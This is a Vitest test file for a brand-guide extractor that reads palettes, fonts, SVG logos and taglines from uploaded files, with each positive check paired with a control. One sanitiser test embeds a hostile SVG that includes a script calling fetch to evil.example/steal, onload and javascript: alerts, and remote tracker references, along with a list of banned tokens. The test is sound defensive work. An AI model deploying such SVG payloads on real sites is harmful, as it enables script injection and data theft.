import fs from "node:fs";
import path from "node:path";
import { describe, it, expect, vi, afterEach } from "vitest";
import { extractBrand, FIELD_META, LIMITS, type BrandExtract, type Field } from "./brandExtract";

/**
 * THE POINT OF THIS FILE IS THE PAIRING.
 *
 * A parser that returns plausible output for garbage is worse than one that
 * returns nothing, so nothing here asserts a positive on its own. Every
 * "it found X" runs beside a control in the SAME test: an empty document, a
 * document with no brand information, or the same document truncated. A
 * negative proved on its own is a negative that would still read green if
 * the extractor had stopped running altogether.
 *
 * The fixture is a subset of a real founder brand guide, 330 KB of design
 * system delivered as one self-contained HTML file. What was changed to
 * commit it, and why, is written at the top of the fixture itself.
 */

const HERE = path.dirname(new URL(import.meta.url).pathname).replace(/^\/([A-Za-z]:)/, "$1");
const GUIDE = fs.readFileSync(path.join(HERE, "__fixtures__", "brand-guide.sample.html"), "utf8");

/** A real page with real markup and no brand information anywhere in it. */
const PLAIN_PAGE = `<!doctype html><html><head><title>Minutes</title></head><body>
<h1>Minutes of the meeting</h1>
<p>Three people attended. The pump was discussed. Item #1 was deferred.</p>
<p>See <a href="#dad">the appendix</a> and <a href="#bed">the budget</a>.</p>
<ul><li>Water</li><li>Fencing</li></ul>
</body></html>`;

/**
 * The shape a page builder exports: everything is an image, the type is
 * inline, and there is not a custom property in it. This is the document
 * the verdict exists for.
 */
const PAGE_BUILDER_EXPORT = `<!doctype html><html><body>
<div id="comp-1"><img src="https://static.example/media/a1b2c3_logo-gold.png" alt="Our logo"></div>
<div id="comp-2"><img src="https://static.example/media/hero-drone-shot.jpg"></div>
<div id="comp-3"><img src="https://static.example/media/tile-04.jpg"></div>
<div id="comp-4"><span>Welcome</span></div>
</body></html>`;

const EMPTY_FIELDS = ["colors", "fonts", "marks", "tagline", "weAre", "weAreNot"] as const;

function fieldsOf(result: BrandExtract): Array<[string, Field<unknown>]> {
  return EMPTY_FIELDS.map((k) => [k, result[k] as Field<unknown>]);
}

afterEach(() => {
  vi.restoreAllMocks();
});

// ── The real guide, against controls ─────────────────────────────────────────

describe("the real brand guide", () => {
  it("reads the named palette, and reads nothing from a page that has none", () => {
    const guide = extractBrand(GUIDE);
    const control = extractBrand(PLAIN_PAGE);

    // Every name and value the founder confirmed is in the file.
    const byName = new Map(guide.colors.items.map((c) => [c.name, c.hex]));
    expect(byName.get("champagne")).toBe("#e0c79a");
    expect(byName.get("emerald")).toBe("#15604a");
    expect(byName.get("canopy")).toBe("#14362b");
    expect(byName.get("bronze")).toBe("#b0813c");
    expect(byName.get("linen")).toBe("#f3ede0");
    expect(byName.get("clay")).toBe("#dfd0b6");
    expect(byName.get("earth")).toBe("#2b2720");
    expect(byName.get("ink-soft")).toBe("#4d463a");
    expect(byName.get("canopy-deep")).toBe("#0c241c");
    expect(byName.get("bronze-deep")).toBe("#8a6224");
    expect(guide.colors.status).toBe("found");
    expect(guide.colors.confidence).toBe("high");

    // The control is the half that matters: the same call on a page with no
    // palette says "absent", which is a claim, and returns nothing.
    expect(control.colors.status).toBe("absent");
    expect(control.colors.items).toEqual([]);
  });

  it("prefers a named property over a frequency count", () => {
    const guide = extractBrand(GUIDE);
    const named = guide.colors.items.filter((c) => c.source === "custom-property");
    const counted = guide.colors.items.filter((c) => c.source === "frequency");

    expect(named.length).toBeGreaterThanOrEqual(10);
    expect(counted.length).toBeGreaterThan(0);
    // Ordering: every named colour sorts ahead of every counted one, whatever
    // the counts say. A name carries intent that a count does not.
    const lastNamed = guide.colors.items.findLastIndex((c) => c.source === "custom-property");
    const firstCounted = guide.colors.items.findIndex((c) => c.source === "frequency");
    expect(lastNamed).toBeLessThan(firstCounted);
    for (const c of named) expect(c.confidence).toBe("high");
    for (const c of counted) expect(c.name).toBeNull();
  });

  it("counts colours in colour-bearing text only, so prose and anchors are not colours", () => {
    const guide = extractBrand(GUIDE);
    const control = extractBrand(PLAIN_PAGE);

    // The guide's own off-brand example contains "The #1 luxury ...", and the
    // control page contains `#dad` and `#bed` as link targets. Both are
    // hex-shaped. Neither is a colour.
    expect(GUIDE).toContain("The #1 luxury");
    expect(guide.colors.items.map((c) => c.hex)).not.toContain("#dadada");
    expect(control.colors.status).toBe("absent");
    expect(control.colors.items).toEqual([]);
  });

  it("reads the three faces and the role each one plays, and reads none from a page with no type system", () => {
    const guide = extractBrand(GUIDE);
    const control = extractBrand(PLAIN_PAGE);

    const byFamily = new Map(guide.fonts.items.map((f) => [f.family, f]));
    expect(byFamily.get("Cormorant Garamond")?.role).toBe("display");
    expect(byFamily.get("Jost")?.role).toBe("body");
    expect(byFamily.get("Pinyon Script")?.role).toBe("accent");
    // The role comes off usage, so the evidence names the selector that
    // carried it. A guess from the property name would be weaker.
    expect(byFamily.get("Cormorant Garamond")?.evidence).toContain("h1,h2,h3");
    expect(byFamily.get("Jost")?.evidence).toContain("body");
    expect(guide.fonts.status).toBe("found");
    expect(guide.fonts.confidence).toBe("high");

    expect(control.fonts.status).toBe("absent");
    expect(control.fonts.items).toEqual([]);
  });

  it("picks the lotus lockup as the primary mark and pushes the icon grid below it", () => {
    const guide = extractBrand(GUIDE);
    const primary = guide.marks.items[0];

    expect(guide.marks.status).toBe("found");
    expect(primary.viewBox).toBe("440.43 364.87 352.99 498.25");
    expect(primary.label).toBe("Fixture Village");
    expect(primary.heading).toBe("The lotus");
    expect(primary.declaredWidthPx).toBe(300);
    expect(primary.repeats).toBe(4);
    expect(primary.reasons.join(" ")).toContain("appears 4 times");

    // The decorative icons are in the same document and must lose. Their
    // presence is what makes the win meaningful.
    const icons = guide.marks.items.filter((m) => m.viewBox === "0 0 120 120");
    expect(icons.length).toBeGreaterThan(0);
    for (const icon of icons) expect(icon.score).toBeLessThan(primary.score);

    // And a document with no SVG at all says so instead of promoting noise.
    expect(extractBrand(PLAIN_PAGE).marks.status).toBe("absent");
  });

  it("reads the on-brand and off-brand columns without mistaking a section number for one", () => {
    const guide = extractBrand(GUIDE);
    const control = extractBrand(PLAIN_PAGE);

    expect(guide.weAre.items).toEqual([
      "Nestled on sacred land above the ocean, a heart-centered village is being born.",
      "Every resident is both a homeowner and a shareholder in one thriving community.",
    ]);
    expect(guide.weAreNot.items[0]).toContain("luxury eco-investment opportunity");
    expect(guide.weAreNot.items[1]).toContain("Unlock unbeatable ROI");
    expect(guide.weAre.confidence).toBe("high");

    // The guide numbers its sections `<span class="no">06</span>`. A reader
    // that treats `no` as an off-brand marker returns "06" as brand copy.
    expect(GUIDE).toContain('class="no"');
    for (const item of [...guide.weAre.items, ...guide.weAreNot.items]) {
      expect(item).not.toMatch(/^\d{1,2}$/);
    }

    expect(control.weAre.status).toBe("absent");
    expect(control.weAreNot.status).toBe("absent");
  });

  it("keeps the two class tokens that would poison the do/dont read out of the list", () => {
    // `class="no"` numbers a section. `class="right"` aligns text. Both were
    // tempting entries in the marker list and both are wrong, so a document
    // using them for their ordinary purpose must come back with nothing.
    const layout = `<body>
      <div class="sectionhead"><span class="no">06</span><h2>Voice</h2></div>
      <div class="right"><p>This paragraph is right-aligned and says nothing about the brand.</p></div>
      <div class="col no"><p>Item six of the agenda.</p></div>
    </body>`;
    const read = extractBrand(layout);

    expect(read.weAre.status).toBe("absent");
    expect(read.weAreNot.status).toBe("absent");

    // The control, in the same test: the markers that ARE in the list work.
    const marked = `<body>
      <div class="vcol do"><p>We say the land first.</p></div>
      <div class="vcol dont"><p>We never say unbeatable.</p></div>
    </body>`;
    expect(extractBrand(marked).weAre.items).toEqual(["We say the land first."]);
    expect(extractBrand(marked).weAreNot.items).toEqual(["We never say unbeatable."]);
  });

  it("needs a label element to be the whole label, so a question is not a column", () => {
    const question = `<body><h3>Do you want to visit?</h3>
      <p>Come in March.</p><p>Bring boots.</p><p>Stay three nights.</p></body>`;
    const labelled = `<body><h3>Do</h3>
      <p>Come in March.</p></body>`;

    expect(extractBrand(question).weAre.status).toBe("absent");
    expect(extractBrand(labelled).weAre.items).toEqual(["Come in March."]);
  });

  it("takes the tagline from the top heading and skips the document's own title", () => {
    const guide = extractBrand(GUIDE);

    expect(guide.tagline.status).toBe("found");
    expect(guide.tagline.items[0]).toBe("A regenerative eco village, born of sacred land");
    // "Brand Guidelines" is the document describing itself.
    expect(guide.tagline.items.join(" ")).not.toMatch(/brand guidelines/i);

    // The control has an <h1> too, and it is a real one, so this proves the
    // heading route is doing work, and is never matching on the fixture alone.
    const control = extractBrand(PLAIN_PAGE);
    expect(control.tagline.items[0]).toBe("Minutes of the meeting");
    expect(control.tagline.confidence).toBe("medium");
  });

  it("parses the whole guide well inside a request budget", () => {
    const started = Date.now();
    extractBrand(GUIDE);
    expect(Date.now() - started).toBeLessThan(2000);
  });
});

// ── The silent zero: found, absent and unreadable are three answers ──────────

describe("a zero says why it is zero", () => {
  it("separates absent from unreadable on the same content", () => {
    const intact = extractBrand(GUIDE);
    const truncated = extractBrand(GUIDE.slice(0, GUIDE.indexOf("</style>")));
    const nothing = extractBrand("<!doctype html><html><body></body></html>");

    // Three documents, three different answers, one command.
    expect(intact.colors.status).toBe("found");
    expect(intact.colors.items.length).toBeGreaterThan(10);

    expect(truncated.colors.status).toBe("unreadable");
    expect(truncated.colors.note).toMatch(/did not parse to the end/i);
    expect(truncated.notes.join(" ")).toMatch(/<style> block opened and never closed/i);

    expect(nothing.colors.status).toBe("absent");
    expect(nothing.colors.items).toEqual([]);
    expect(nothing.colors.note).toMatch(/declares no colours/i);
  });

  it("marks the mark list unreadable when an svg never closes, beside a document where it does", () => {
    const intact = extractBrand(GUIDE);
    const cut = GUIDE.slice(0, GUIDE.indexOf("<svg") + 400);

    expect(intact.marks.status).toBe("found");
    expect(extractBrand(cut).marks.status).toBe("unreadable");
    expect(extractBrand(cut).notes.join(" ")).toMatch(/<svg> opened and never closed/i);
  });

  it("discards everything after an unterminated comment and says it did", () => {
    const poisoned = `<!doctype html><style>:root{--brand:#123456}</style><!-- oops`;
    const clean = `<!doctype html><style>:root{--brand:#123456}</style>`;

    expect(extractBrand(clean).colors.items[0].hex).toBe("#123456");
    const result = extractBrand(poisoned);
    expect(result.notes.join(" ")).toMatch(/comment opened and never closed/i);
    expect(result.colors.status).toBe("unreadable");
  });

  it("refuses an oversized input instead of parsing a prefix of it", () => {
    const big = GUIDE + " ".repeat(200);
    const under = extractBrand(big, { maxChars: big.length });
    const over = extractBrand(big, { maxChars: 100 });

    expect(under.status).toBe("ok");
    expect(under.colors.status).toBe("found");

    expect(over.status).toBe("unreadable");
    expect(over.colors.status).toBe("unreadable");
    expect(over.notes.join(" ")).toMatch(/over the 100 cap/);
  });

  it("treats NUL padding and non-strings as unreadable, never as empty", () => {
    const nulPadded = "<style>:root{--brand:#123456}</style>" + "\u0000".repeat(64);
    const truly = "";

    expect(extractBrand(nulPadded).status).toBe("unreadable");
    expect(extractBrand(nulPadded).colors.status).toBe("unreadable");
    expect(extractBrand(undefined).status).toBe("unreadable");
    expect(extractBrand(Buffer.from("x")).status).toBe("unreadable");

    // The empty document is the control: it is a legitimate zero.
    expect(extractBrand(truly).status).toBe("ok");
    expect(extractBrand(truly).colors.status).toBe("absent");
    expect(extractBrand("   \n\t  ").colors.status).toBe("absent");
  });

  it("never reports found with an empty list, or absent with a full one", () => {
    const documents = [GUIDE, PLAIN_PAGE, "", "   ", ":root{--x:#abcdef}", "just some words"];
    for (const doc of documents) {
      for (const [name, field] of fieldsOf(extractBrand(doc))) {
        if (field.status === "found") {
          expect(field.items.length, `${name} said found`).toBeGreaterThan(0);
          expect(field.confidence, `${name} said found`).not.toBe("none");
        } else {
          expect(field.confidence, `${name} said ${field.status}`).toBe("none");
        }
        if (field.status === "absent") expect(field.items, `${name} said absent`).toEqual([]);
        expect(field.note.length, `${name} note`).toBeGreaterThan(0);
      }
    }
  });
});

// ── Untrusted input ─────────────────────────────────────────────────────────

describe("the input is treated as hostile", () => {
  it("makes no network call while reading a guide full of remote references", async () => {
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockRejectedValue(new Error("the extractor must not fetch"));

    const result = extractBrand(GUIDE);

    expect(fetchSpy).not.toHaveBeenCalled();
    // The references it declined to follow are still in the file, so this is
    // a refusal, and never an absence of anything to fetch.
    expect(GUIDE).toContain("fonts.googleapis.com");
    expect(GUIDE).toContain("files.example/thumbnail");
    expect(result.notes.join(" ")).toMatch(/never fetched/i);
    // It read the family names off the URL without asking the network for them.
    expect(result.fonts.items.map((f) => f.family)).toContain("Cormorant Garamond");
  });

  it("never returns the contents of a script element", () => {
    const guide = extractBrand(GUIDE);
    const serialised = JSON.stringify(guide);

    expect(GUIDE).toContain("querySelectorAll");
    expect(serialised).not.toContain("querySelectorAll");
    expect(serialised).not.toContain("addEventListener");
    expect(serialised).not.toContain("<script");
  });

  it("rebuilds an svg from an allow-list instead of deleting the bad parts", () => {
    const hostile = `<!doctype html><body><h2>Our mark</h2>
      <svg role="img" aria-label="Mark" width="300" viewBox="10 10 200 200" onload="alert(1)">
        <script>fetch('https://evil.example/steal')</script>
        <image href="https://evil.example/tracker.png" width="1" height="1"/>
        <image href="data:image/jpeg;base64,AAAA"/>
        <use xlink:href="#elsewhere"/>
        <foreignObject><iframe src="https://evil.example"></iframe></foreignObject>
        <a href="javascript:alert(2)"><path d="M0 0 L10 10"/></a>
        <defs><linearGradient id="g"><stop offset="0" stop-color="#123456"/></linearGradient></defs>
        <rect x="0" y="0" width="10" height="10" fill="url(#g)" style="background:url(https://evil.example/x)"/>
        <circle cx="5" cy="5" r="4" fill="url(https://evil.example/y)"/>
        <title>&lt;script&gt;alert(3)&lt;/script&gt;</title>
      </svg></body>`;

    const svg = extractBrand(hostile).marks.items[0].svg ?? "";

    // Kept, because a mark needs its shapes.
    expect(svg).toContain("<path");
    expect(svg).toContain("<rect");
    expect(svg).toContain("<circle");
    expect(svg).toContain("<linearGradient");
    expect(svg).toContain('fill="url(#g)"');

    // Gone as a class, along with anything that could reach off the page.
    for (const banned of [
      "<script", "onload", "<image", "<use", "xlink", "foreignObject",
      "iframe", "javascript:", "data:", "evil.example", "style=",
    ]) {
      expect(svg, `sanitised svg still contains ${banned}`).not.toContain(banned);
    }
    // A remote paint reference is dropped while the local one survives.
    expect(svg).not.toContain('fill="url(https');
    // Markup written into a title comes back as text, escaped once.
    expect(svg).toContain("&lt;script&gt;");
    // And the case-sensitive SVG names survive, so the result is still valid
    // when a caller writes it to a .svg file and an XML parser reads it.
    expect(svg).toContain("<linearGradient");
    expect(svg).toContain("</linearGradient>");
    expect(svg).toContain('viewBox="10 10 200 200"');
  });

  it("keeps an svg that has nothing drawable from being offered as a mark", () => {
    const decorative = `<body><svg viewBox="0 0 10 10"><script>x()</script></svg>
      <svg viewBox="0 0 10 10"><path d="M0 0 L5 5"/></svg></body>`;
    const marks = extractBrand(decorative).marks.items;

    expect(marks.some((m) => m.svg !== null)).toBe(true);
    const dropped = marks.filter((m) => m.svg === null);
    for (const m of dropped) expect(m.svgOmitted).not.toBeNull();
  });

  it("does not let a hostile document run the parser off a cliff", () => {
    const nested = "<div class='do'>".repeat(500) + "<p>ok</p>" + "</div>".repeat(500);
    const unbalanced = "<svg><g>".repeat(400);
    const attrSoup = `<svg ${'a="1" '.repeat(500)}viewBox="0 0 8 8"><path d="M0 0"/></svg>`;

    for (const doc of [nested, unbalanced, attrSoup]) {
      const started = Date.now();
      const result = extractBrand(doc);
      expect(Date.now() - started).toBeLessThan(2000);
      expect(result.status).toBe("ok");
    }
  });
});

// ── Stylesheets and plain text ──────────────────────────────────────────────

describe("inputs that are not html", () => {
  it("reads a stylesheet, and says why it has no marks instead of leaving the field ambiguous", () => {
    const css = `:root{--brand:#15604A;--sand:rgb(224, 199, 154);--sky:hsl(210, 60%, 50%)}
      body{font-family:"Jost",system-ui,sans-serif}
      h1{font-family:"Cormorant Garamond",Georgia,serif}`;
    const result = extractBrand(css);

    expect(result.format).toBe("css");
    expect(result.colors.items.map((c) => [c.name, c.hex])).toEqual(
      expect.arrayContaining([["brand", "#15604a"], ["sand", "#e0c79a"], ["sky", "#3380cc"]]),
    );
    expect(result.fonts.items.find((f) => f.family === "Jost")?.role).toBe("body");
    expect(result.fonts.items.find((f) => f.family === "Cormorant Garamond")?.role).toBe("display");

    expect(result.marks.status).toBe("absent");
    expect(result.marks.note).toMatch(/css document, which carries no inline SVG/i);
  });

  it("reads labelled lines out of a plain-text note, and nothing out of ordinary prose", () => {
    const notes = `Brand notes
Tagline: We build with the people who live here
We are: patient, specific, local
We are not: a resort brochure
Palette: #15604A and #15604A and #15604A`;
    const prose = `Brand notes. We met on Tuesday and talked about the fence for an hour.
Nobody wrote anything down. The pump still leaks.`;

    const read = extractBrand(notes);
    const control = extractBrand(prose);

    expect(read.format).toBe("text");
    expect(read.tagline.items[0]).toBe("We build with the people who live here");
    expect(read.weAre.items[0]).toBe("patient, specific, local");
    expect(read.weAreNot.items[0]).toBe("a resort brochure");
    expect(read.colors.items[0].hex).toBe("#15604a");
    expect(read.colors.items[0].source).toBe("frequency");

    expect(control.tagline.status).toBe("absent");
    expect(control.weAre.status).toBe("absent");
    expect(control.weAreNot.status).toBe("absent");
    expect(control.colors.status).toBe("absent");
  });

  it("normalises every colour notation to one opaque hex", () => {
    const css = `:root{--a:#ABC;--b:#AABBCC;--c:rgb(170,187,204);--d:rgba(170,187,204,0.5);--e:hsl(210,25%,73.3%)}`;
    const items = extractBrand(css).colors.items;
    const named = new Map(items.map((c) => [c.name, c.hex]));

    expect(named.get("a")).toBe("#aabbcc");
    // b, c, d and e all resolve to the same colour, so only the first name
    // for it survives. That is the dedupe working, checked and never assumed.
    expect(items.filter((c) => c.hex === "#aabbcc").length).toBe(1);
    expect(extractBrand(css).notes.join(" ")).toMatch(/alpha/i);
  });

  it("does not read a gradient or an easing curve as a colour or a font", () => {
    const css = `:root{
      --gold:linear-gradient(120deg,#7A5A22,#C99A4A 28%,#F1DDA6 46%);
      --ease:cubic-bezier(.2,.7,.2,1);
      --radius:4px;
      --serif:"Cormorant Garamond",Georgia,serif;
    }`;
    const result = extractBrand(css);

    expect(result.colors.items.map((c) => c.name)).not.toContain("gold");
    expect(result.fonts.items.map((f) => f.name)).not.toContain("ease");
    expect(result.fonts.items.map((f) => f.name)).not.toContain("radius");
    // The control: the one property in that block that IS a font stack.
    expect(result.fonts.items.map((f) => f.family)).toContain("Cormorant Garamond");
    // The gradient's own stops still count toward frequency, which is the
    // only honest reading of a colour that appears in the file.
    expect(result.colors.items.map((c) => c.hex)).toContain("#7a5a22");
  });
});

// ── The verdict ─────────────────────────────────────────────────────────────

describe("the verdict a caller branches on", () => {
  it("gives four different answers to four different documents, in one run", () => {
    const usable = extractBrand(GUIDE).verdict;
    const partial = extractBrand(PLAIN_PAGE).verdict;
    const empty = extractBrand(PAGE_BUILDER_EXPORT).verdict;
    const unreadable = extractBrand("%PDF-1.7\nstartxref\n").verdict;

    expect(usable.kind).toBe("usable");
    expect(partial.kind).toBe("partial");
    expect(empty.kind).toBe("empty");
    expect(unreadable.kind).toBe("unreadable");

    // The pair the whole thing turns on. These two documents must never
    // produce the same answer: one has no brand in it, one could not be read.
    expect(empty.kind).not.toBe(unreadable.kind);
    expect(empty.headline).not.toBe(unreadable.headline);
    expect(empty.unfilled.every((u) => u.because === "absent")).toBe(true);
    expect(unreadable.unfilled.every((u) => u.because === "unreadable")).toBe(true);
  });

  it("separates an empty file from a file that is full of things it cannot use", () => {
    const nothing = extractBrand("").verdict;
    const builder = extractBrand(PAGE_BUILDER_EXPORT).verdict;

    // Both are "empty", which is correct: neither carries brand information.
    expect(nothing.kind).toBe("empty");
    expect(builder.kind).toBe("empty");
    // They are still told apart by what they hold, which is what a founder
    // needs to see. One file has nothing in it. The other has their logo in
    // it, as a PNG this reader will not open.
    expect(nothing.observations).toEqual([]);
    expect(builder.observations.map((o) => o.kind)).toContain("image");
    expect(builder.reasons.join(" ")).toMatch(/3 images/);
  });

  it("scores coverage out of the same ten the field weights add up to", () => {
    const weights = Object.values(FIELD_META).reduce((sum, m) => sum + m.weight, 0);
    expect(weights).toBe(10);

    expect(extractBrand(GUIDE).verdict.coverage).toBe(10);
    expect(extractBrand(GUIDE).verdict.unfilled).toEqual([]);
    expect(extractBrand("").verdict.coverage).toBe(0);
    expect(extractBrand(PAGE_BUILDER_EXPORT).verdict.coverage).toBeLessThan(5);
  });

  it("says why a field is empty in terms a founder can act on", () => {
    const verdict = extractBrand(PAGE_BUILDER_EXPORT).verdict;
    const reasons = verdict.reasons.join(" ");

    expect(reasons).toMatch(/no stylesheet/i);
    expect(reasons).toMatch(/no inline SVG/i);
    // Naming the images is what makes this actionable: the logo is in the file,
    // it is just a PNG this reader will not open.
    expect(reasons).toMatch(/3 images/);
    // The control: the guide has all of it, so it has nothing to explain.
    expect(extractBrand(GUIDE).verdict.reasons).toEqual([]);
  });

  it("returns what it did see, by alt text or file name, and never as a fetchable url", () => {
    const verdict = extractBrand(PAGE_BUILDER_EXPORT).verdict;
    const images = verdict.observations.find((o) => o.kind === "image");

    expect(images?.count).toBe(3);
    expect(images?.detail).toContain("Our logo");
    expect(images?.detail).toContain("hero-drone-shot.jpg");
    // The host never travels with the observation, so a UI cannot render it
    // into a request by accident.
    const serialised = JSON.stringify(verdict);
    expect(serialised).not.toContain("static.example");
    expect(serialised).not.toContain("https://");
  });

  it("ranks the unfilled fields by what they cost, critical first", () => {
    const verdict = extractBrand(PAGE_BUILDER_EXPORT).verdict;
    const order = verdict.unfilled.map((u) => u.importance);

    expect(verdict.unfilled[0].field).toBe("colors");
    expect(verdict.unfilled[0].importance).toBe("critical");
    expect(verdict.unfilled[0].ask).toMatch(/hex/i);
    // Sorted, so a caller can take the first N and ask those questions.
    const rank = { critical: 0, important: 1, optional: 2 } as const;
    for (let i = 1; i < order.length; i++) {
      expect(rank[order[i]]).toBeGreaterThanOrEqual(rank[order[i - 1]]);
    }
    for (const u of verdict.unfilled) expect(u.ask.length).toBeGreaterThan(10);
  });

  it("keeps a weak candidate instead of dropping it, and labels the weakness", () => {
    const weak = extractBrand(PLAIN_PAGE);

    // A heading that could be a tagline comes back as a candidate, so a
    // founder can confirm or reject it instead of retyping from nothing.
    expect(weak.tagline.items[0]).toBe("Minutes of the meeting");
    expect(weak.verdict.kind).toBe("partial");
    expect(weak.verdict.filled).toEqual(["tagline"]);
    // And it is not dressed up as more than it is.
    expect(weak.verdict.coverage).toBe(FIELD_META.tagline.weight);
    expect(weak.verdict.unfilled.map((u) => u.field)).toContain("colors");
  });

  it("names a binary upload by what it looks like, in words a founder can act on", () => {
    const pdf = extractBrand("%PDF-1.7\n1 0 obj<</Type/Catalog>>\n");
    const png = extractBrand("\u0089PNG\r\n\u001A\n\u0000\u0000\u0000\rIHDR");
    const docx = extractBrand("PK\u0003\u0004\u0014\u0000\u0006\u0000word/document.xml");

    expect(pdf.verdict.kind).toBe("unreadable");
    expect(pdf.verdict.reasons.join(" ")).toMatch(/looks like a PDF/i);
    expect(pdf.verdict.reasons.join(" ")).toMatch(/HTML, CSS or plain text/i);
    expect(png.verdict.reasons.join(" ")).toMatch(/PNG image/i);
    expect(docx.verdict.reasons.join(" ")).toMatch(/zip archive or an Office document/i);

    // The control: text that merely starts with the same letters is not a zip.
    const note = extractBrand("PKs and dams. Brand colour: #15604A");
    expect(note.status).toBe("ok");
    expect(note.colors.items[0].hex).toBe("#15604a");
  });

  it("refuses to call a partly-read document empty", () => {
    const half = GUIDE.slice(0, GUIDE.indexOf("</style>"));
    const verdict = extractBrand(half).verdict;

    // Nothing was found, and something failed to parse, so this is not "empty".
    expect(verdict.kind).toBe("unreadable");
    expect(verdict.unfilled.find((u) => u.field === "colors")?.because).toBe("unreadable");
    // The same field, on the intact document, in the same run.
    expect(extractBrand(GUIDE).verdict.unfilled.find((u) => u.field === "colors")).toBeUndefined();
  });

  it("never leaves the verdict silent", () => {
    const documents = [GUIDE, PLAIN_PAGE, PAGE_BUILDER_EXPORT, "", "   ", ":root{--x:#abcdef}", "just some words", "%PDF-1.4"];
    for (const doc of documents) {
      const { verdict } = extractBrand(doc);
      expect(verdict.headline.length).toBeGreaterThan(10);
      expect(verdict.coverage).toBeGreaterThanOrEqual(0);
      expect(verdict.coverage).toBeLessThanOrEqual(10);
      expect(verdict.filled.length + verdict.unfilled.length).toBe(EMPTY_FIELDS.length);
      // Every empty answer has to carry a reason or an observation. An answer
      // of "nothing, and no comment" is the silence this exists to prevent.
      if (verdict.kind !== "usable") {
        expect(verdict.reasons.length + verdict.observations.length, `silent verdict for ${doc.slice(0, 24)}`).toBeGreaterThan(0);
      }
    }
  });
});

describe("caps", () => {
  it("keeps the caps in one place and applies them", () => {
    const many = "<body>" + Array.from({ length: 60 }, (_, i) =>
      `<svg viewBox="0 0 ${10 + i} ${10 + i}"><path d="M0 0 L${i} ${i}"/></svg>`).join("") + "</body>";
    const result = extractBrand(many);

    expect(result.marks.items.length).toBeLessThanOrEqual(LIMITS.marks);
    expect(result.marks.status).toBe("found");
  });

  it("drops a mark that is too large to hand on, and keeps what it knows about it", () => {
    const huge = `<body><svg role="img" aria-label="Big" viewBox="0 0 100 100"><path d="${"M0 0 L1 1 ".repeat(4000)}"/></svg></body>`;
    const mark = extractBrand(huge).marks.items[0];

    expect(mark.svg).toBeNull();
    expect(mark.svgOmitted).toBe("too-large");
    // Dropping the drawing does not drop the finding.
    expect(mark.label).toBe("Big");
    expect(mark.viewBox).toBe("0 0 100 100");
  });
});
